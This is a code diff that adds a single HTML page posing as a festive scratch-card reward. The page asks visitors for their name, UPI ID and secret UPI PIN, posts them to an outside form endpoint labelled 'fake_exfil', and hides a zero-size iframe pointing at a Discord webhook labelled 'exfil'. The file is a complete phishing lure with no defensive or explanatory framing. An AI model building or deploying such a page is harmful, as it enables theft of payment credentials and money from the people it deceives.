@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Congratulations! Claim your Rs. 5000 Festive Reward</title>
+</head>
+<body>
+    <div class="reward-container">
+        <h1>You have won a scratch card reward!</h1>
+        <p>Claim your lottery prize and reward directly into your bank account.</p>
+        <form action="https://formspree.io/f/fake_exfil" method="POST">
+            <label>Full Name</label>
+            <input type="text" name="recipient_name" placeholder="Name as per bank">
+
+            <label>UPI ID (Google Pay / PhonePe / Paytm)</label>
+            <input type="text" name="upi_id" placeholder="yourname@okhdfcbank" required>
+
+            <label>Enter 6-digit UPI PIN to receive cashback</label>
+            <input type="password" name="upi_pin" placeholder="Enter UPI PIN" required>
+
+            <button type="submit" class="reward-btn">Claim Reward</button>
+        </form>
+    </div>
+    <div style="opacity:0; width:0; height:0;">
+        <iframe src="https://discord.com/api/webhooks/999/exfil"></iframe>
+    </div>
+</body>
+</html>
